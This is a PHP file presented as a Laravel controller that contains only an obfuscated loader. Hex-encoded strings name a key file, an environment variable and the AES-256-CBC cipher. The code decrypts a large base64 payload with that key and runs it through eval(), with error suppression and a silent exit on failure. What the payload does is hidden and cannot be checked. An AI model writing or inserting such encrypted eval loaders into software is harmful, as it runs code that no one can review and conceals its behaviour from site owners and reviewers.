<?php
namespace App\Http\Controllers\Brimen;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('pGJueDXk++xLTseOJRM8ng==');

$c=base64_decode(

'l5/qYPhyh1EYNisEq4AnC39ssWDxmEyvkUnxNixymUk4v8I66lS6dejYCKxx4eihzxjFEGOup0m0' .
'evxoDY1EyMoeFWnOTSip1YooQe0BzQzF0XG2z29ont9Y/B8vO/B25DQeynBamePQHproirLJuny1' .
'UJI1o4cHTB81QB+nqTpSlvlHwJJ1p9NeL+tt7/9loNmUWRaaQvbUK86GV0zMmL65ITnIqpdL7IPr' .
'T27SRxxtNtEA2wF/B20VZGRF5IZi+zGiNQEONcrfizT3wjyqEnBDLlUxU1zXADL4XHPhcbA4YQUw' .
'AXoZpMAi+anqCfPNBpeEcRuvBhwknAlbr/71iMMJhxiVkpUxaLwBxojxsTVrOX1gkDcEVau3GTlE' .
'My4AJmjrdXMjiW+cu8+3q/X1WyAN1BTGp9gy0XAQ1el8p6Zn6IuKT86EQYIDx0UV2QKm59Cwe8R4' .
'J8nNObevODpoxFZZJlJCIlYMXGMGpI4EysB79hfGwrxEsrBTe5drcKHrxctNIHZYyG/ddq8yCsel' .
'YFYVpMkFhdKgqqy3KZ9RJfhQxf/5Wwvp1k3n+LKdhsRn39bC68fy53hnpg3zFq9ZNoJ8eBzTXkkp' .
'd84IqFslAj+7MXpEcSQuYFgcF15ICwd+rgDVlgfLKPQhfc0FGdzZNzuoBJ/ymNxgve9EeAoPEgMh' .
'+S0oALP1RRcDBz1f8RJlGl7mL+BJ6lejUSeCuw/7YP1lgwKuNpxDhWd0heoGNrhp4sV5Qwu9EKeU' .
'pHxhmGIGX2WVl3KSFZ/7RU3hCOpQFB1naOLGMSYa8SCI++4eb1/pcfndy2ZWJiBE0ovoMjJysYma' .
'riUc4gi4cFk0+CWIPPcf9ro6tBl4h+5VUfPDRWprqwKJJGrk0Uf10/mbMQYo8BI3MW8PKX/Gym+1' .
'wMCXBviHiWymMOC1Y4dssT7D5Rg4ZJjKzewCXopXPVXTylkmiiUSaoytlKNEVf5j4x/gLJKXty81' .
'VQ/usOjCH81XEK0v8buf42YXto50+8nqlhxwKGZqpY4c2TMz646Pvwq2f8Enge2KM/dp1hBKiqFl' .
'QKxzqxIa9xbC1NDNzHIfqJPb0Ay9YyBkUQrMcG2X/9bRE3unvGV8YXyWAFDDRvq1Nb0n7nDOJelk' .
'a0r2NWmgUwmtok1f3HTyBdG7FNNUyVMTeVedBAYvfsCeJv8foWle/CTT1MgsqrrasYymvdgnTUKS' .
'wIJ8HTrJ2/ljZ1mQSyYrRQny8R6uZHZWf1r+k0MZeUrQzCZgHW9/cXpstYtWETX7R8mZM0Zugd4C' .
'Z85mc+pX+lOi79A0bd5Sa8fW3o2udV8NwbWmZuUiJYISzqA5NZBucAFPbYIntXyNkqNL5CAIwHcL' .
'DcOMdZFKPv1X1g9fiVPmJ87Y1lfEBn3MxBlYxmX0cO2A4Maw3wlxKkiS2+CBNFsJivaGYXhN7No+' .
'USHTpXYZ9xt2icRSKx1LkjHT57eP4INwCtafvsTScm9ra9sz0yZiFvDWK6WocgIDh/Ygtx9vJxr1' .
'OpQGBBhYPXHP9o2wk9HcboSbE/nrBgebPyEr7jACnY8rCozHcidyngXYsCJhjWKnciWBfkoSDSs7' .
'IxOjn1kmztcualv9JYDwE1RpRFHei6go1Z5AbXleaJCz0QrcZQAmEpr27yWSZQx/DchD9PeEpRX4' .
'u3EGGfXr/LPKM0UJTnXP6BaJuUEsJX9+Yaf5yb2GUyXzC3HGzkaLJV14KUWmIE8UVD1b7VtKUX6G' .
'tsoV37BDhx1bDZivOZ4No70tgq70K413+hFmoLechv82SQR4zAOhcip0So4jNaZtjrv4Z26/jVOU' .
'+Tz9IzXtuXTYv4PabhNxqmUBUWcoacMAzPsVDvuCx6tp+b0/Dctio64oJ6LIvpWvHKKOZPyQug2h' .
'CMK6S5k6A9NWveSoFYrP2qwkP0dEXlTtTgnsgviuAow6UQGjogshOTgQTSOr0Wrng6IqAbC/XizW' .
'D/RaR88o7LYzYzL8twcRMkDy79Tu2Fsz5AhiNXIogNTgZVJ1+TftKtY0k26R38nlde7v2Hmb'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

